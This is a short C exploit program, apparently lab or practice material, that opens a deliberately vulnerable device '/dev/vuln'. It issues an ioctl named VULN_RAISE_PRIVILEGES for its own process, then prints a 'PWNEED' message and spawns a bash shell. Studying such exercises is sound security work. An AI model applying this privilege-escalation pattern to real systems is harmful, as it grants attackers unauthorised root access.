#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#include "vuln_ioctl.h"

int main()
{
	int fd = open("/dev/vuln", O_RDWR);
	if (fd < 0) {
		perror("open dev failed:");
		return -1;
	}

	struct pinfo ctx = {
		.pid = getpid(),
	};
	int ret = ioctl(fd, VULN_RAISE_PRIVILEGES, &ctx);
	close(fd);
	if (ret) {
		perror("vuln ioctl failed:");
		return ret;
	}
	printf("PWNEED!!!\n");
	return execl("/bin/bash", "-sh", NULL);
}
